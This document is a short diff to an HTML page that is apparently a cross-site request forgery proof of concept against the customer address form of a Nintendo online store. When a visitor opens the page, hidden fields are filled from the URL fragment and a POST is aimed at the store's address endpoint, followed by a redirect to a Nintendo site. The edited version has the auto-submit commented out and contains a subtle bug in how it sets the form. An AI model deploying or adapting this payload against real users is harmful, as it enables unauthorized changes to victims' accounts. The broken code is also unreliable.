@@ -1,18 +1,20 @@
+
 <html>
 <script type="text/javascript">   
     function initForm() {
-
+        lang = document.location.hash.split('&')[1].split('=')
         form = document.getElementById('id_key').setAttribute('value', document.location.hash.replace('#',''));
-        document.csrf_form.submit();
+        form.action = "https://mynintendostore.nintendo."+lang+"/customer/address/formPost/"
+        //document.csrf_form.submit();
         window.setTimeout(redirect, 200);
         
     }
     function redirect(argument) {
-        document.location.href = 'https://www.nintendo.de/';
+        document.location.href = 'https://www.nintendo.'+lang;
     }
 </script>
 <body onload="initForm()">
- <form name="csrf_form" action="https://mynintendostore.nintendo.it/customer/address/formPost/" method="POST">
+ <form name="csrf_form" method="POST">
     <input type="hidden" id="id_key" name="form_key" value="">
     <input type="hidden" name="success_url" value="">
     <input type="hidden" name="error_url" value="">
@@ -33,5 +35,3 @@
   </form>
 </body>
 </html>
-
-
